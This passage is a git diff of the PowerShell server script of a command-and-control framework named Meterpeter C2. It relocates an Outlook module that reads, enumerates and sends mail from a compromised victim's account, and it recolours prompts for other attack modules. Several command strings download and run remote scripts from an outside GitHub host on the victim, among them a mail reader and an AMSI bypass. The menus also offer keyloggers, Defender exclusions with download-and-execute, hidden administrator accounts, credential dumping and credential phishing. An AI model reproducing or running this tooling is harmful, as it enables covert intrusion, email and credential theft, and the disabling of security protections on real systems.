-               $UseVerbose = "True"
-            }
-            Else
-            {
-               $UseVerbose = "False"            
-            }
-
-            Write-Host " - Create report logfile? (y|n): " -NoNewline;
-            $CreateLogFileSetting = Read-Host;
-            If($CreateLogFileSetting -iMatch '^(y|yes)$')
-            {
-               $CreateLogFileSetting = "True"
-            }
-            Else
-            {
-               $CreateLogFileSetting = "False"            
-            }
-
-            #Execute command remotely
-            Write-Host " * Scanning OutLook for Email Objects" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
-         }
-         If($OutLook_choise -ieq "Filter" -or $OutLook_choise -ieq "SenderName")
-         {
-            Write-Host " - Search 'SenderName' Objects : " -NoNewline;
-            $SenderNameSearch = Read-Host;
-            If(-not($SenderNameSearch) -or $SenderNameSearch -ieq $null)
-            {
-               write-host ""
-               write-host " [error] This function requires 'SenderName' inputs .." -ForegroundColor Red -BackgroundColor Black
-               $OutLook_choise = $null
-               $Command = $Null;
-            }
-            Else
-            {
-
-               Write-Host " - Max outlook items to display: " -NoNewline;
-               $MaxOfObjectsToDisplay = Read-Host;
-               If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
-               {
-                  $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
-               }
-
-               Write-Host " - Display message <BODY> (y|n): " -NoNewline;
-               $UseVerbose = Read-Host;
-               If($UseVerbose -iMatch '^(y|yes)$')
-               {
-                  $UseVerbose = "True"
-               }
-               Else
-               {
-                  $UseVerbose = "False"            
-               }
-
-               Write-Host " - Create report logfile? (y|n): " -NoNewline;
-               $CreateLogFileSetting = Read-Host;
-               If($CreateLogFileSetting -iMatch '^(y|yes)$')
-               {
-                  $CreateLogFileSetting = "True"
-               }
-               Else
-               {
-                  $CreateLogFileSetting = "False"            
-               }
-
-               #Execute command remotely
-               Write-Host " * Scanning OutLook for '$SenderNameSearch' Objects" -ForegroundColor Green
-               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -Filter `"$SenderNameSearch`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
-            }
-         }
-         If($OutLook_choise -ieq "SendMail")
-         {
-
-            #<SendTo>, <SendSubject>, <SendBody>
-            Write-Host " - SendTo Email : " -NoNewline;
-            $SendTo = Read-Host;
-            If(-not($SendTo) -or $SendTo -ieq $null)
-            {
-               write-host "`n"
-               write-host "   [Error] Module requires 'SendTo' address!" -ForegroundColor Red -BackgroundColor Black
-               write-host "   [ inf ] SendTo: 'pedroUbuntui@gmail.com'" -ForegroundColor DarkGray
-               $OutLook_choise = $null
-               $Command = $null
-            }
-            Else
-            {
-               Write-Host " - Email Subject: " -NoNewline;
-               $SendSubject = Read-Host;
-               If(-not($SendSubject) -or $SendSubject -ieq $null)
-               {
-                  $SendSubject = "@Meterpeter C2 v2.10.11 Email"
-               }
-
-               Write-Host " - Email Body   : " -NoNewline;
-               $SendBody = Read-Host;
-               If(-not($SendBody) -or $SendBody -ieq $null)
-               {
-                  $SendBody = "Testing @Meterpeter C2 SendEmail funtion ..."
-               }
-
-               #Execute command remotely
-               Write-Host " * Send Email using OutLook!" -ForegroundColor Green
-               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Unblock-File;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'send' -SendTo '$SendTo' -SendSubject '$SendSubject' -SendBody '$SendBody' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
-            }
-         }
-         If($OutLook_choise -ieq "Return" -or $OutLook_choise -ieq "cls" -or $OutLook_choise -ieq "Modules")
-         {
-            $OutLook_choise = $null
-            $Command = $Null;
-         }
-      }    
+      }  
       If($choise -ieq "FRM" -or $choise -ieq "FRManager")
       {
          write-host "`n`n   Remark:" -ForegroundColor Yellow;
@@ -2032,8 +1915,10 @@ While($Client.Connected)
          write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
          write-host "   -------   -----------                     -------------------";
          write-host "   Query     Query 'active' firewall rules   UserLand";
-         write-host "   Create    Block application\program rule  Administrator";
-         write-host "   Delete    Delete sellected firewall rule  Administrator";
+         write-host "   Create    Block application\program rule  " -NoNewline
+         write-host "Administrator" -ForegroundColor Red;
+         write-host "   Delete    Delete sellected firewall rule  " -NoNewline
+         write-host "Administrator" -ForegroundColor Red;
          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
          write-host "`n`n :meterpeter:Adv:Frm> " -NoNewline -ForeGroundColor Green;
          $Firewall_choise = Read-Host;
@@ -2047,7 +1932,7 @@ While($Client.Connected)
             Write-Host " * Create new 'Block' firewall rule." -ForegroundColor Green
             Write-Host "   => Remark: Dont use double quotes in inputs!" -ForegroundColor Yellow
             
-            Write-Host " - The new firewall rule DisplayName: " -NoNewline;
+            Write-Host " - The new firewall rule DisplayName: " -ForeGroundColor Red -NoNewline;
             $DisplayName = Read-Host
             If(-not($DisplayName) -or $DisplayName -ieq $null)
             {
@@ -2055,7 +1940,7 @@ While($Client.Connected)
                Write-Host "   => Error: wrong input, set demo to '$DisplayName'" -ForegroundColor Red
             }
 
-            Write-Host " - The Program to 'block' full path : " -NoNewline;
+            Write-Host " - The Program to 'block' full path : " -ForeGroundColor Red -NoNewline;
             $Program = Read-Host
             If(-not($Program) -or $Program -ieq $null)
             {
@@ -2095,7 +1980,7 @@ While($Client.Connected)
             Write-Host " * Delete existing Block\Allow firewall rule." -ForegroundColor Green
             Write-Host "   => Remark: Dont use double quotes in inputs!" -ForegroundColor Yellow
 
-            Write-Host " - The DisplayName of the rule to delete: " -NoNewline;
+            Write-Host " - The DisplayName of the rule to delete: " -ForeGroundColor Red -NoNewline;
             $DisplayName = Read-Host
             If(-not($DisplayName) -or $DisplayName -ieq $null)
             {
@@ -2169,7 +2054,7 @@ While($Client.Connected)
          }
         If($choise -ieq "Browser")
         {
-           Write-Host " - Start or Stop browser keyloger? (start|stop): " -ForegroundColor DarkYellow -NoNewline
+           Write-Host " - Start or Stop browser keyloger? (start|stop): " -ForegroundColor Red -NoNewline
            $Exechoise = Read-Host
            If($Exechoise -iMatch '^(stop)$')
            {
@@ -2178,7 +2063,7 @@ While($Client.Connected)
            }
            Else
            {
-              Write-Host " - Delay time (in seconds) between captures (3): " -NoNewline
+              Write-Host " - Delay time (in seconds) between captures (3): "  -NoNewline
               $Delay = Read-Host
               If($Delay -lt 3)
               {
@@ -2186,7 +2071,7 @@ While($Client.Connected)
               }
 
               $StarTimer = (Get-Date -Format 'HH:mm')
-              Write-Host " - Schedule the capture start time? ($StarTimer|now): " -NoNewline
+              Write-Host " - Schedule the capture start time? ($StarTimer|now): " -ForeGroundColor Red -NoNewline
               $StartMe = Read-Host
               If($StartMe -NotMatch '^(\d+\d+:+\d+\d)$')
               {
@@ -2211,7 +2096,7 @@ While($Client.Connected)
            ## Random FileName generation
            $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
            $CaptureFile = "$Env:TMP\MouseCapture-" + "$Rand.zip" ## Capture File Name
-           Write-Host " - Time of capture (seconds): " -NoNewline
+           Write-Host " - Time of capture (seconds): " -ForeGroundColor Red -NoNewline
            [int]$Timmer = Read-Host
            If([int]$Timmer -lt 10)
            {
@@ -2235,7 +2120,7 @@ While($Client.Connected)
         }
         If($choise -ieq "Keystrokes")
         {
-           Write-Host " - Start or Stop keystrokes keyloger? (start|stop): " -ForegroundColor DarkYellow -NoNewline
+           Write-Host " - Start or Stop keystrokes keyloger? (start|stop): " -ForegroundColor Red -NoNewline
            $Exechoise = Read-Host
            If($Exechoise -iMatch '^(stop)$')
            {
@@ -2244,7 +2129,7 @@ While($Client.Connected)
            }
            Else
            {
-              Write-Host " - Use PS v2 to exec keylogger? (y|n): " -NoNewline
+              Write-Host " - Use PS v2 to exec keylogger? (y|n): " -ForeGroundColor Red -NoNewline
               $UsePS2 = Read-Host
               If($UsePS2 -iMatch '^(y|yes)$')
               {
@@ -2280,7 +2165,7 @@ While($Client.Connected)
            If($PasteBinChoise -ieq "Start")
            {
               $PasteSettings = "True"
-              Write-Host " - Input PastebinUsername  : " -NoNewline
+              Write-Host " - Input PastebinUsername  : " -ForeGroundColor Red -NoNewline
               $PastebinUsername = Read-Host
               If($PastebinUsername -eq $null)
               {
@@ -2289,7 +2174,7 @@ While($Client.Connected)
                  write-host "   => error: missing -PastebinUsername parameter" -ForegroundColor Red -BackgroundColor Black
               }
 
-              Write-Host " - Input PastebinPassword  : " -NoNewline
+              Write-Host " - Input PastebinPassword  : " -ForeGroundColor Red -NoNewline
               $PastebinPassword = Read-Host
               If($PastebinPassword -eq $null)
               {
@@ -2381,6 +2266,7 @@ While($Client.Connected)
       write-host "   Passwords   Search for credentials inside files";
       write-host "   BruteAcc    Brute-force user account password";
       write-host "   PhishCred   Promp remote user for logon creds";
+      write-host "   OutLook     Manage OutLook Exchange Email Objects";
       write-host "   AMSIpatch   Disable AMS1 within current process";
       write-host "   Allprivs    Enable all shell privs to exec cmdline";
       write-host "   DumpSAM     DumpLSASS/SAM/SYSTEM/SECURITY metadata";
@@ -2390,6 +2276,128 @@ While($Client.Connected)
       write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
+      If($choise -ieq "OutLook")
+      {
+         write-host "`n`n   Description:" -ForegroundColor Yellow;
+         write-host "   Module to enumerate OutLook Exchange Emails, Read is contents";
+         write-host "   on terminal console or dump found Email Objects to a logfile.";
+         write-host "   If invoked -SemdMail then target address will be used as Sender." -ForegroundColor Yellow;
+         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
+         write-host "   -------   -----------                     ------------------";
+         write-host "   Folders   Display outlook folder names    UserLand";
+         write-host "   Contacts  Display outlook contacts info   UserLand";
+         write-host "   Emails    Display outlook email objects   UserLand";
+         write-host "   SendMail  Send Email using target domain  UserLand";
+         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+         write-host "`n`n :meterpeter:Post:OutLook> " -NoNewline -ForeGroundColor Green;
+         $OutLook_choise = Read-Host;
+         If($OutLook_choise -ieq "Folders")
+         {
+            #Execute command remotely
+            Write-Host " * Scanning OutLook for folder names!" -ForegroundColor Green
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}";
+         }
+         If($OutLook_choise -ieq "Contacts")
+         {
+            Write-Host " - Max outlook items to display: " -NoNewline;
+            $MaxOfObjectsToDisplay = Read-Host;
+            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
+            {
+               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
+            }
+
+            Write-Host " - Create report logfile? (y|n): " -NoNewline;
+            $CreateLogFileSetting = Read-Host;
+            If($CreateLogFileSetting -iMatch '^(y|yes)$')
+            {
+               $CreateLogFileSetting = "True"
+            }
+            Else
+            {
+               $CreateLogFileSetting = "False"            
+            }
+
+            #Execute command remotely
+            Write-Host " * Scanning OutLook for Contact Objects" -ForegroundColor Green
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+         }
+         If($OutLook_choise -ieq "Emails")
+         {
+            Write-Host " - Max outlook items to display: " -NoNewline;
+            $MaxOfObjectsToDisplay = Read-Host;
+            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
+            {
+               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
+            }
+
+            Write-Host " - Display message <BODY> (y|n): " -NoNewline;
+            $UseVerbose = Read-Host;
+            If($UseVerbose -iMatch '^(y|yes)$')
+            {
+               $UseVerbose = "True"
+            }
+            Else
+            {
+               $UseVerbose = "False"            
+            }
+
+            Write-Host " - Create report logfile? (y|n): " -NoNewline;
+            $CreateLogFileSetting = Read-Host;
+            If($CreateLogFileSetting -iMatch '^(y|yes)$')
+            {
+               $CreateLogFileSetting = "True"
+            }
+            Else
+            {
+               $CreateLogFileSetting = "False"            
+            }
+
+            #Execute command remotely
+            Write-Host " * Scanning OutLook for Email Objects" -ForegroundColor Green
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+         }
+         If($OutLook_choise -ieq "SendMail")
+         {
+            #<SendTo>, <SendSubject>, <SendBody>
+            Write-Host " - Send To Email: " -ForegroundColor Red -NoNewline;
+            $SendTo = Read-Host;
+            If(-not($SendTo) -or $SendTo -ieq $null)
+            {
+               write-host "`n"
+               write-host "   [Error] Module requires 'SendTo' address!" -ForegroundColor Red -BackgroundColor Black
+               write-host "   [ inf ] SendTo: 'pedroUbuntui@gmail.com'" -ForegroundColor DarkGray
+               $OutLook_choise = $null
+               $Command = $null
+            }
+            Else
+            {
+               Write-Host " - Email Subject: " -NoNewline;
+               $SendSubject = Read-Host;
+               If(-not($SendSubject) -or $SendSubject -ieq $null)
+               {
+                  $SendSubject = "@Meterpeter C2 v2.10.11 Email"
+               }
+
+               Write-Host " - Email Body   : " -NoNewline;
+               $SendBody = Read-Host;
+               If(-not($SendBody) -or $SendBody -ieq $null)
+               {
+                  $SendBody = "Testing @Meterpeter C2 SendEmail funtion ..."
+               }
+
+               #Execute command remotely
+               Write-Host " * Send Email using '" -ForegroundColor Green -NoNewline
+               Write-Host "$Remote_Host" -ForegroundColor DarkYellow -NoNewline
+               Write-Host "' OutLook!" -ForegroundColor Green
+               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Unblock-File;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'send' -SendTo '$SendTo' -SendSubject '$SendSubject' -SendBody '$SendBody' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+            }
+         }
+         If($OutLook_choise -ieq "Return" -or $OutLook_choise -ieq "cls" -or $OutLook_choise -ieq "Modules")
+         {
+            $OutLook_choise = $null
+            $Command = $Null;
+         }
+      } 
       If($choise -ieq "HiddenDir" -or $choise -ieq "Hidden")
       {
          write-host "`n`n   Description:" -ForegroundColor Yellow
@@ -2408,14 +2416,14 @@ While($Client.Connected)
          $Vault_choise = Read-Host;
          If($Vault_choise -ieq "Search")
          {
-            $FolderName = Read-Host " - Folder name to search ";
+            $FolderName = Read-Host " - Folder name to search "
             If(-not($FolderName) -or $FolderName -ieq $null)
             {
                $FolderName = "false"
                Write-Host "   => Error: wrong FolderName, set demo to 'false' .." -ForegroundColor Red
             }
 
-            $Directory = Read-Host " - The directory to scan ";
+            $Directory = Read-Host " - The directory to scan "
             If(-not($Directory) -or $Directory -ieq $null)
             {
                $Directory = "false"
@@ -2424,7 +2432,8 @@ While($Client.Connected)
             }
             Else
             {
-               $Recursive = Read-Host " - Recursive search (y|n)";
+               Write-Host " - Recursive search (y|n):" -ForeGroundColor Red -NoNewline
+               $Recursive = Read-Host
                If($Recursive -iMatch '^(y|yes)$')
                {
                   $Recursive = "True"
@@ -2440,14 +2449,14 @@ While($Client.Connected)
          }
          If($Vault_choise -ieq "Super")
          {
-            $FolderName = Read-Host " - Folder name to search ";
+            $FolderName = Read-Host " - Folder name to search "
             If(-not($FolderName) -or $FolderName -ieq $null)
             {
                $FolderName = "false"
                Write-Host "   => Error: wrong FolderName, set demo to 'false' .." -ForegroundColor Red
             }
 
-            $Directory = Read-Host " - The directory to scan ";
+            $Directory = Read-Host " - The directory to scan "
             If(-not($Directory) -or $Directory -ieq $null)
             {
                $Directory = "false"
@@ -2456,7 +2465,8 @@ While($Client.Connected)
             }
             Else
             {
-               $Recursive = Read-Host " - Recursive search (y|n)";
+               Write-Host " - Recursive search (y|n):" -ForeGroundColor Red -NoNewline
+               $Recursive = Read-Host
                If($Recursive -iMatch '^(y|yes)$')
                {
                   $Recursive = "True"
@@ -2472,7 +2482,8 @@ While($Client.Connected)
          }
          If($Vault_choise -ieq "Create")
          {
-            $Action = Read-Host " - Create Hidden or Visible dir"
+            Write-Host " - Create Hidden or Visible dir:" -ForeGroundColor Red -NoNewline
+            $Action = Read-Host
             If(-not($Action) -or $Action -ieq $null)
             {
                $Action = "hidden"
@@ -2486,7 +2497,7 @@ While($Client.Connected)
                write-host "    => wrong input, default to '$FolderName'" -ForegroundColor Red
             }
 
-            $Directory = Read-Host " - The storage directory to use";
+            $Directory = Read-Host " - The storage directory to use"
             If(-not($Directory) -or $Directory -ieq $null)
             {
                $Directory = "`$Env:TMP"
@@ -2498,7 +2509,8 @@ While($Client.Connected)
          }
          If($Vault_choise -ieq "Delete")
          {
-            $FolderName = Read-Host " - Folder name to delete"
+            Write-Host " - Folder name to delete:" -ForeGroundColor Red -NoNewline
+            $FolderName = Read-Host
             If(-not($FolderName) -or $FolderName -ieq $null)
             {
                $FolderName = "vault"
@@ -2532,10 +2544,14 @@ While($Client.Connected)
         write-host "   Remark: URI will be upload to %TMP% and not deleted after execution." -ForegroundColor Yellow
         write-host "`n`n   Modules     Description                      Privileges Required" -ForegroundColor green;
         write-host "   -------     -----------                      -------------------";
-        write-host "   Query       Query all Defender exclusions    Administrator";
-        write-host "   Create      Create a new Defender exclusion  Administrator";
-        write-host "   UrlExec     Download\Exec through exclusion  Administrator";
-        write-host "   Delete      Delete one Defender exclusion    Administrator";
+        write-host "   Query       Query all Defender exclusions    " -NoNewline
+        write-host "Administrator" -ForegroundColor Red;
+        write-host "   Create      Create a new Defender exclusion  " -NoNewline
+        write-host "Administrator" -ForegroundColor Red;
+        write-host "   UrlExec     Download\Exec through exclusion  " -NoNewline
+        write-host "Administrator" -ForegroundColor Red;
+        write-host "   Delete      Delete one Defender exclusion    " -NoNewline
+        write-host "Administrator" -ForegroundColor Red;
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Exclusions> " -NoNewline -ForeGroundColor Green;
         $WD_choise = Read-Host;
@@ -2547,13 +2563,13 @@ While($Client.Connected)
         }
         If($WD_choise -ieq "Create")
         {
-           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -NoNewline;
+           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -ForeGroundColor Red -NoNewline;
            $ExcludeType = Read-Host;
            If(-not($ExcludeType) -or $ExcludeType -eq $null)
            {
               $ExcludeType = "ExclusionPath"
            }
-           write-host " - Exclude from Defender scans: " -NoNewline;
+           write-host " - Exclude from Defender scans: " -ForeGroundColor Red -NoNewline;
            $ExcludePath = Read-Host;
            If(-not($ExcludePath) -or $ExcludePath -eq $null)
            {
@@ -2566,7 +2582,7 @@ While($Client.Connected)
         }
         If($WD_choise -ieq "UrlExec")
         {
-           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -NoNewline;
+           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -ForeGroundColor Red -NoNewline;
            $ExcludeType = Read-Host;
            If(-not($ExcludeType) -or $ExcludeType -eq $null)
            {
@@ -2598,13 +2614,13 @@ While($Client.Connected)
         }
         If($WD_choise -ieq "Delete")
         {
-           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -NoNewline;
+           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -ForeGroundColor Red -NoNewline;
            $ExcludeType = Read-Host;
            If(-not($ExcludeType) -or $ExcludeType -eq $null)
            {
               $ExcludeType = "ExclusionPath"
            }
-           write-host " - Exclusion entry to delete: " -NoNewline;
+           write-host " - Exclusion entry to delete: " -ForeGroundColor Red -NoNewline;
            $ExcludePath = Read-Host;
            If(-not($ExcludePath) -or $ExcludePath -eq $null)
            {
@@ -2631,8 +2647,10 @@ While($Client.Connected)
         write-host "   (by: @gtworek) to elevate shell token privileges."
         write-host "`n`n   Modules     Description                             Privileges Required" -ForegroundColor green
         write-host "   -------     -----------                             -------------------";
-        write-host "   demo        Enable all token privileges (client)    Administrator";
-        write-host "   cmdline     Execute 1 cmdline with full privileges  Administrator";
+        write-host "   demo        Enable all token privileges (client)    " -NoNewline
+        write-host "Administrator" -ForegroundColor Red;
+        write-host "   cmdline     Execute 1 cmdline with full privileges  " -NoNewline
+        write-host "Administrator" -ForegroundColor Red;
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Allprivs> " -NoNewline -ForeGroundColor Green;
         $all_choise = Read-Host;
@@ -2645,7 +2663,7 @@ While($Client.Connected)
         }
         If($all_choise -ieq "cmdline")
         {
-           write-host " - cmdline to execute: " -NoNewline;
+           write-host " - cmdline to execute: " -ForeGroundColor Red -NoNewline;
            $CmdlineToExecute = Read-Host;
            If(-not($CmdlineToExecute) -or $CmdlineToExecute -eq $null)
            {
@@ -2685,13 +2703,13 @@ While($Client.Connected)
            write-host "  2        FORC`E_AM`SI_ERROR"
            write-host "  3        AM`SI_UT`ILS_P`AT`CH`n"
 
-           write-host " - Bypass technic to use (2|3): " -NoNewline;
+           write-host " - Bypass technic to use (2|3): " -ForeGroundColor Red -NoNewline;
            $Technic = Read-Host;
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -Egg true"
         }
         If($Patch_choise -ieq "FilePath")
         {
-           write-host " - Bypass technic to use (2|3)  : " -NoNewline;
+           write-host " - Bypass technic to use (2|3)  : " -ForeGroundColor Red -NoNewline;
            $Technic = Read-Host;
            write-host " - Execute script trough bypass : " -NoNewline;
            $FilePath = Read-Host;
@@ -2700,7 +2718,7 @@ While($Client.Connected)
 
            If($MArs -iMatch '^(y|yes)$')
            {
-              write-host " - Input script arguments       : " -NoNewline;
+              write-host " - Input script arguments       : " -ForeGroundColor Red -NoNewline;
               $FileArgs = Read-Host;
               $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -filepath `"$FilePath`" -fileargs `"$FileArgs`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force";
            }
@@ -2711,7 +2729,7 @@ While($Client.Connected)
         }
         If($Patch_choise -ieq "PayloadUrl")
         {
-           write-host " - Bypass technic to use (2|3)  : " -NoNewline;
+           write-host " - Bypass technic to use (2|3)  : " -ForeGroundColor Red -NoNewline;
            $Technic = Read-Host;
            write-host " - The Payload Url link         : " -NoNewline;
            $PayloadUrl = Read-Host;
@@ -2720,7 +2738,7 @@ While($Client.Connected)
 
            If($MArs -iMatch '^(y|yes)$')
            {
-              write-host " - Input script arguments       : " -NoNewline;
+              write-host " - Input script arguments       : " -ForeGroundColor Red -NoNewline;
               $FileArgs = Read-Host;
               $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -Payloadurl `"$PayloadUrl`" -fileargs `"$FileArgs`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force";
            }
@@ -2753,7 +2771,7 @@ While($Client.Connected)
         $my_choise = Read-Host;
         If($my_choise -ieq "Agressive")
         {
-           write-host " - Use agressive reports? (y|n): " -NoNewline;
+           write-host " - Use agressive reports? (y|n): "  -NoNewline;
            $VerOut = Read-Host;
            Write-Host " * Search for ALL EOP possible entrys." -ForegroundColor Green;Start-Sleep -Seconds 1;
            If($VerOut -iMatch '^(y|yes)$')
@@ -2812,8 +2830,10 @@ While($Client.Connected)
          write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
          write-host "   -------  -----------                  ------------------";
          write-host "   Query    Query all accounts           UserLand";
-         write-host "   Create   Create hidden account        Administrator";
-         write-host "   Delete   Delete hidden account        Administrator ";
+         write-host "   Create   Create hidden account        " -NoNewline
+         write-host "Administrator" -ForegroundColor Red;
+         write-host "   Delete   Delete hidden account        " -NoNewline
+         write-host "Administrator" -ForegroundColor Red;
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
          write-host "`n`n :meterpeter:Post:HideUser> " -NoNewline -ForeGroundColor Green;
          $AccManager_choise = Read-Host;
@@ -2824,9 +2844,12 @@ While($Client.Connected)
          }
          If($AccManager_choise -ieq "Create")
          {
-            $AccountName = Read-Host " - Input account name"
-            $password = Read-Host " - Input account pass"
-            $AccountState = Read-Host " - Account State (hidden|visible)"
+            Write-Host " - Input account name:" -ForeGroundColor Red -NoNewline
+            $AccountName = Read-Host
+            Write-Host " - Input account pass:" -ForeGroundColor Red -NoNewline
+            $password = Read-Host
+            Write-Host " - Account State (hidden|visible):" -ForeGroundColor Red -NoNewline
+            $AccountState = Read-Host
             Write-Host " * Create new user account" -ForegroundColor Green
             If(-not($AccountState) -or $AccountState -ieq $null){$AccountState = "hidden"}Else{$AccountState = "visible"}
